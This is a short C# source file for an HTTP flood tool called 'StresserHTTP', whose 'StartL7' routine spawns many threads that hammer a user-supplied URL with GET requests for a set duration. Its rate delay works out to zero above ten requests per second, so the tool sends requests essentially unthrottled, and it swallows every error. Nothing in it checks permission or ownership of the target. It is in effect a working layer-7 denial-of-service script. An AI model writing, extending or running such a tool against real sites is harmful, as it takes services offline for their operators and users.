using System.Diagnostics;

namespace StresserHTTP
{
    class Program
    {
        private static readonly HttpClient _client = new HttpClient();
        public static string version = "1.0.0.0";
        public static async Task Main(string[] args)
        {
            Console.Clear();
            string? target = null;
            string? threads = null;
            string? requestspersecond = null;
            string? durationseconds = null;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--target" && i + 1 < args.Length)
                {
                    target = args[i + 1];
                }
                else if (args[i] == "--threads" && i + 1 < args.Length)
                {
                    threads = args[i + 1];
                }
                else if (args[i] == "--requestspersecond" && i + 1 < args.Length)
                {
                    requestspersecond = args[i + 1];
                }
                else if (args[i] == "--durationseconds" && i + 1 < args.Length)
                {
                    durationseconds = args[i + 1];
                }

            }
            if (string.IsNullOrWhiteSpace(target) || string.IsNullOrWhiteSpace(threads) || string.IsNullOrWhiteSpace(requestspersecond) || string.IsNullOrWhiteSpace(durationseconds))
            {
                Console.WriteLine("Usage: ./StresserHTTP --target http<s>://<domain> --threads <15> --requestspersecond <1500> --durationseconds <60>");
                return;
            }
            int nRPS = toInt(requestspersecond);
            int DS = toInt(durationseconds);
            int TH = toInt(threads);
            await StartL7(target, TH, nRPS, DS);
        }
        public static int toInt(string value)
        {
            return int.Parse(value);
        }

     public static async Task SendGetRequests(string url, int threads, int requestsPerSecond, int durationSeconds)
        {
            var tasks = new List<Task>();

            for (int i = 0; i < threads; i++)
            {
                tasks.Add(Task.Run(() => FireRequests(url, requestsPerSecond, durationSeconds)));
            }

            await Task.WhenAll(tasks.ToArray());
        }

        private static async Task FireRequests(string url, int requestsPerSecond, int durationSeconds)
        {
            var delay = (int)(0010.0 / requestsPerSecond);

            var stopwatch = Stopwatch.StartNew();
            while (stopwatch.Elapsed.TotalSeconds < durationSeconds)
            {
                try
                {
                    await _client.GetAsync(url);
                }
                catch (Exception)
                {

                }
                await Task.Delay(delay);
            }
        }

        public static async Task StartL7(string targetUrl, int threads, int requestsPerSecond, int durationSeconds)
        {
            await SendGetRequests(targetUrl, threads, requestsPerSecond, durationSeconds);
        }

    }

}